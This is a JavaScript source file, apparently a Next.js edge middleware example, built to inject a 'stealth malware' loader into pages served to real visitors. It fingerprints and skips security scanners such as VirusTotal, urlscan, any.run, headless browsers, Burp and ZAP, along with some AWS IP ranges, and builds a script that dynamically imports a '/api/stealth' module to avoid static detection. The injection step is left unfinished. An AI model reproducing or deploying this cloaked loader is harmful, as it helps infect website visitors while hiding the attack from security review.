import { NextResponse } from 'next/server';

export function middleware(request) {
    const response = NextResponse.next();
    
    // Only inject malware for real users, not scanners
    if (isRealUser(request)) {
        injectStealthMalware(response);
    }
    
    return response;
}

function isRealUser(request) {
    const ua = request.headers.get('user-agent') || '';
    const ip = request.headers.get('x-forwarded-for');
    
    // Block common security scanners
    const scannerPatterns = [
        'virus-total', 'urlscan.io', 'any.run', 'sandbox',
        'headless', 'phantom', 'puppeteer', 'selenium',
        'securityscan', 'metasploit', 'burp', 'zap'
    ];
    
    const isScanner = scannerPatterns.some(pattern => 
        ua.toLowerCase().includes(pattern.toLowerCase())
    );
    
    // Block known security company IPs
    const securityIPs = [
        '52.0.', '54.165.', '35.180.', '18.206.' // Example AWS IP ranges used by scanners
    ];
    
    const isSecurityIP = securityIPs.some(ipRange => 
        ip && ip.startsWith(ipRange)
    );
    
    return !isScanner && !isSecurityIP;
}

function injectStealthMalware(response) {
    // This would modify HTML responses to inject malicious scripts
    // In Vercel, this is done through Edge Middleware
    
    const script = `
        <script>
            // Stealth malware loader
            (function() {
                // Wait for page to fully load
                if (document.readyState === 'loading') {
                    document.addEventListener('DOMContentLoaded', loadMalware);
                } else {
                    setTimeout(loadMalware, 1000);
                }
                
                function loadMalware() {
                    // Dynamic import to avoid static detection
                    import('/api/stealth?t=' + Date.now())
                        .then(module => module.activate())
                        .catch(err => console.log('Module load error'));
                }
            })();
        </script>
    `;
    
    // In real implementation, this would modify the response body
    // This is simplified for example purposes
}